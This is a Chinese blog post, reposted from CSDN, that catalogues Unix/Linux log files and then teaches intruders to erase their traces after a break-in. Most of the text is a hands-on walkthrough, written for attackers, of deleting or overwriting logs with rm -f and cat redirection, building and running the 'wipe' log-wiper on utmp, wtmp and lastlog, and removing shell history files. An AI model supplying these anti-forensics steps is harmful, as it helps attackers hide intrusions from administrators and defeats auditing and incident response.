# Linux系统的LOG日志文件及入侵后日志的清除 - DoubleLi - 博客园






UNIX网管员主要是靠系统的LOG,来获得入侵的痕迹.当然也有第三方工具记录入侵系统的 痕迹,UNIX系统存放LOG文件,普通位置如下:

/usr/adm - 早期版本的UNIX
/var/adm - 新一点的版本使用这个位置
/var/log - 一些版本的Solaris,linux BSD,Free BSD使用这个位置
/etc - 多数UNIX版本把utmp放在这里，有些也把wtmp放在这里，syslog.conf在这里

下面的一些文件根据你所在的目录不同而不同：
acct 或 pacct -- 记录每个用户使用的命令记录
access_log -- 主要当服务器运行NCSA HTTPD时, 记录什么站点连接过你的服务器
aculog -- 保存着你拨出去的MODEMS记录
lastlog -- 记录了用户最近的LOGIN记录和每个用户的最初目的地，有时是最后不
成功LOGIN的记录,当一个用户登陆到unix系统，注册程序在lastlog文件中查找该用户的uid，如果该程序找到了

该用户的uid，unix就会显示最后一次登陆的时间和tty（终端号）
loginlog -- 记录一些不正常的LOGIN记录
messages -- 记录输出到系统控制台的记录，另外的信息由syslog来生成
security -- 记录一些使用UUCP系统企图进入限制范围的事例
sulog -- 记录使用su命令的记录．它通常在/var/adm/sulog．如果你在机器上使用了su命令，别忘了清除哦．
utmp -- 记录当前登录到系统中的所有用户， 这个文件伴随着用户进入和离开系统而不断变化.它还会为系统中的用户保持很长的历史记录，utmp日志通常存放在/var/adm/utmp目录下．可以用w和who命令查看，其他命令也可以访问这个文件．如：finger　root就可以．现在的utmp一般都有utmpx文件作为日志记录的补充．
utmpx -- UTMP的扩展
wtmp -- 记录用户登录和退出事件．它和utmp日志文件相似，但它随着登陆次数的增加，它会变的越来越大，有些系统的ftp访问也在这个文件里记录，同时它也记录正常的系统退出时间,可以用ac和last命令访问．
syslog -- 最重要的日志文件，使用syslogd守护程序来获得日志信息，通常情况下通过查看/etc/syslog.conf．我们可以知道syslog记录些什么．缺省时，它把大多的消息传给/var/adm/message．
/dev/log -- 一个UNIX域套接字，接受在本地机器上运行的进程所产生的消息
/dev/klog -- 一个从UNIX内核接受消息的设备
514端口 -- 一个INTERNET套接字，接受其他机器通过UDP产生的syslog消息。
uucp -- 记录的UUCP的信息，可以被本地UUCP活动更新， 也可有远程站点发起
的动作修改，信息包括发出和接受的呼叫，发出的请求，发送者， 发
送时间和发送主机
lpd-errs -- 处理打印机故障信息的日志
ftp日志 -- 执行带-l选项的ftpd能够获得记录功能
httpd日志 -- HTTPD服务器在日志中记录每一个WEB访问记录
history日志 -- 这个文件保存了用户最近输入命令的记录
vold.log -- 记录使用外接媒介时遇到的错误记录

======================
其他类型的日志文件-
======================
有些类型的LOG文件没有特定的标题，但开始于一个特定的标志， 你可以在前面头发现如
下的标志，这就一般表示此是个LOG日志文件，你就可以编辑它了：
xfer -- 表明试图一个禁止的文件传输.
rexe -- 表明试图执行一个不允许的命令
还有许多其他其他类型的LOG文件存在，主要是第三方软件引起的， 或者甚至他妈的网管
自己有设置了一只"眼睛"在他的系统上，所以你要对你认为可能是LOG文件的文件多一份心眼。
许多管理员喜欢把日志文件放在同一个目录中以便管理， 所以你要检查你发现的LOG文件所在
的目录中，是否有其他日志文件放在这里，如果有,咯，你知道怎么做。
另一个你要注意的是有关LOG用户MAIL的文件，此文件名可以多种多样，或则有时是
syslog文件的一部分。你要知道syslog记录那些信息， 你可以查看syslog.conf中的信息此文
件的目录是在/etc中
一般我们都是查看syslog.conf文件来查看日志的配置情况.例如:cat /etc/syslog.conf

其中sunos操作系统的在/var/log和/var/adm下，还有/usr/adm为/var/adm的的链接．

redhat的在/var/log 和 /var/run下

下面的是sun os5.7中的日志样本． 此外，各种shell还会记录用户使用的命令历史，它使用用户主目录下的文件来记录这些命令历史，通常这个文件的名字为.sh_history(ksh)，.history(csh)，或.bash_history(bash)等。 

# ls /var/adm 

acct 　　　log 　　　　 messages.1 　　　passwd 　　　sulog　　 vold.log 

aculog　　 messages 　　messages.2　　　 sa 　　　　　utmp 　 　wtmp 

lastlog 　 messages.0 　messages.3 　　　spellhist 　 utmpx　　 wtmpx 

# ls /var/log 

authlog　　　　　 syslog 　　　syslog.1 　　syslog.3 

sysidconfig.log 　syslog.0　　 syslog.2 　　syslog.4



下面的是redhat9.0中的日志样本． 

# ls /var/log 

boot.log 　　dmesg 　　　　　　messages.2 　　　secure 　　　　uucp 

boot.log.1 　htmlaccess.log　　messages.3 　　　secure.1 　　　wtmp 

boot.log.2 　httpd 　　　　　　messages.4　　 　secure.2 　　　wtmp.1 

boot.log.3 　lastlog 　　　　　netconf.log　　　secure.3 　　　xferlog 

boot.log.4 　mailllog 　　　　 netconf.log.1　　secure.4 　　　xferlog.1 

cron 　　　　maillog 　　　　　netconf.log.2　　sendmail.st 　 xferlog.2 

cron.1　　　 maillog.1 　　　　netconf.log.3　　spooler 　　　 xferlog.3 

cron.2　　　 maillog.2 　　　　netconf.log.4　　spooler.1 　　 xferlog.4 

cron.3　　　 maillog.3 　　　　news 　　　　　　spooler.2 

cron.4　　　 maillog.4 　　　　normal.log 　　　spooler.3 

daily.log 　 messages　　　　　realtime.log　 　spooler.4 

daily.sh 　　messages.1 　　　 samba 　　　　 　transfer.log 



# ls /var/run 

atd.pid　　 　gpm.pid 　　　klogd.pid 　　random-seed 　　 treemenu.cache 

crond.pid 　　identd.pid 　 netreport 　　runlevel.dir 　　utmp 

ftp.pids-all　inetd.pid 　　news 　　　　 syslogd.pid

一般我们要清除的日志有 

lastlog 

utmp(utmpx) 

wtmp(wtmpx) 

messages 

syslog 

sulog

一般把以上说的日志给擦一下，就可以了．：）

下面我来说说上面这些我们要清除的日志的相关资料和清除方法．更详细的资料和其他的日志请你查看相关资料．

上面已经对日志的功能做了简单陈述，那么这些日志文件到底记录的是什么呢？follow　me

下面是一个例子： 

SunOS 5.7 

login: gao 

Password: 

No directory! Logging in with home=/ 

Last login: Sun Feb 4 22:18:25 from 219.31.36.7

Sun Microsystems Inc. SunOS 5.7 Generic October 1998 $ 

然后注册程序用新的登陆时间和TTY信息更新lastlog文件，而且该程序带更新utmp wtmp.文件．

shell记录：


.sh_history(ksh)，.history(csh)，或.bash_history(bash)等，是shell执行时的历史记录．记录用户执行的命令．它一般存在于用户的主目录．别忘了去根目录看看.



1.日志都是一些文本形式的文件．最笨的方法是用文本编辑器来编辑日志文件．删除相关的记录．来达到擦拭脚印和隐藏自己的效果.

比如用vi等 

但这样做是很笨的．太麻烦，工作量太大．



2.用rm -f 来删掉日志．比如rm -f /usr/adm/lastlog 

这样做是很蠢的． 

更容易被管理员发现有人入侵．但是，相对来说自己还是保护好了．：） 

可以用在一些不太重要的机器上． 



３．用＞定向符清除．

比如：

cat　＞　/usr/log/lastlog


－＞这里输入你要的写的东西．最好伪装得像一些，也可以不输入哦．：） 

^d　－＞这里的^d是按键 ctrl + d. 

# ．



4.当然最好的是用日志清除工具． 

输入几个命令让程序帮你擦：） 

a.常见的日志清除工具． 

下面介绍一个比较好的日志清除器．：） 



[http://packetstormsecurity.nl/UNIX/penetration/log-wipers/wipe-1.00.tgz](http://packetstormsecurity.nl/UNIX/penetration/log-wipers/wipe-1.00.tgz)

他完全可以清除 

lastlog

utmp

utmpx

wtmp

wtmpx



下面我们来看看．（示范工作平台sunos 5.7） 

# gzip -d wipe-1.00.tgz 

# tar -xf wipe-1.00.tar 

# cd wipe-1.00 

# ls -al 

总数32 

drwxr-xr-x　 2 　root 　root 　　　　512　　 2月 4 20:48　　 . 

drwxrwxrwx 　6 　root 　other　　　 1024　　 2月 4 18:40　　 .. 

-rw-r--r-- 　1 　root 　root 　　　　130　　 1997 1月 9　　 INSTALL 

-rw-r--r--　 1 　root 　staff　　　 1389　　 1997 1月 9　　 Makefile 

-rw-r--r--　 1 　root 　root 　　　　498 　　1997 1月 9 　　README 

-rw-r--r--　 1 　root 　staff　　　10027　　 1997 1月 9　　 wipe.c 

# make 

Wipe v0.01 ! 

Usage: 'make ' where System types are: 

linux freebsd sunos4 solaris2 ultrix 

　　aix irix digital bsdi netbsd hpux 



# 

我们可以看到它需要出示 系统的选项．这些选项是： 

　　linux freebsd sunos4 solaris2 ultrix 

　　aix irix digital bsdi netbsd hpux 

我们要清除相关的系统日志就必须在相同的系统下编译． 

比如我们要在redhat等linux下编译，就应为： make linux 

在freebsd下编译就应为：make freebsd 

在sunos 4下编译，就应为： make sunos4 

在sunos 5以上的系统里编译，就应为：make solaris2  

# make solaris2 

gcc -O3 -DHAVE_LASTLOG_H -DHAVE_UTMPX -o wipe wipe.c 

# ls -al 

总数94 

drwxr-xr-x 　2 　root 　root　　　512　　 2月 4 21:03　　 . 

drwxrwxrwx 　6 　root 　other　　1024　　 2月 4 18:40　　 .. 

-rw-r--r-- 　1 　root 　root　　　130　　 1997 1月 9 　　INSTALL 

-rw-r--r-- 　1 　root 　staff　　1389　　 1997 1月 9 　　Makefile 

-rw-r--r-- 　1 　root 　root 　　 498　　 1997 1月 9 　　README 

-rwxr-xr-x 　1 　root 　other 　30920　　 2月 4 21:03　　wipe 

-rw-r--r-- 　1 　root 　staff 　10027　　 1997 1月 9 　　wipe.c 

#./wipe 

USAGE: wipe [ uwla ] ...options... 

UTMP editing: Erase all usernames : wipe u [username] 

　　Erase one username on tty: wipe u [username] [tty] 

WTMP editing: Erase last entry for user : wipe w [username] 

　　Erase last entry on tty : wipe w [username] [tty] LASTLOG 

editing: Blank lastlog for user : wipe l [username] Alter lastlog 

　　entry : wipe l [username] [tty] [time] [host] 

　　Where [time] is in the format [YYMMddhhmm] 

ACCT editing: Erase acct entries on tty : wipe a [username] [tty] 

大家可以看到编译好的wipe的使用方法． 

其中 u 选项为 utmp utmpx 日志擦除．. 

w 选项为 wtmp wtmpx 日志擦除． 

l 选项为 lastlog 日志擦除． 

a 为/var/adm/pacct日志擦除．（一般不用这个．：） 

其中[tty]为终端号．为在有多个相同帐号同时登陆时，清除日志的使用选项．当然是要你的终端号哦．：） 

大家可以用 w 命令查终端号． 

比如: 

# w 

下午 9:15 1 user, 平均负荷: 0.00, 0.00, 0.01 

用户名 　　终端号 　　登入时间 　　闲置 　　JCPU 　　PCPU 　　执行命令 

root　　　pts/1 　　下午 7:40　　

　　 　　　3 　　　　　　　　　w 

下面的是我在sunos 5.7上的具体的使用情况

# w 

下午 9:15 1 user, 平均负荷: 0.00, 0.00, 0.01 

用户名 　　终端号 　　登入时间 　　闲置 　　JCPU 　　PCPU 　　执行命令 

root　　pts/1 　　下午 7:40　　　　 　　　3 　　　　　　　　　w  





# ./wipe u root 

Patching /var/adm/utmp .... Done. 

Patching /var/adm/utmpx .... Done. 

# w 

下午 9:15 1 user, 平均负荷: 0.00, 0.00, 0.01 

用户名 　　终端号 　　登入时间 　　闲置 　　JCPU 　　PCPU 　　执行命令 

# ./wipe w gao 

Patching /var/adm/wtmp .... Done. 

Patching /var/adm/wtmpx .... Done. 

# ./wipe l root 

Patching /var/adm/lastlog .... Done.

好了． 

lastlog utmp utmpx wtmp wtmpx 擦完了．   



当然我们不要忘了shell　记录． 

# ls -al /.*history 

-rw------- 1 root other 456 2月 4 20:27 .sh_history 

# rm -f .*history 

# cd 

# pwd 

/home/gao 



# ls -al /.*history 

-rw------- 1 root other 456 2月 4 20:27 .sh_history 

# rm -f .*history



ok, 算是大功告成吧





转自[http://blog.csdn.net/meiyouhuiyi/article/details/1219815](http://blog.csdn.net/meiyouhuiyi/article/details/1219815)









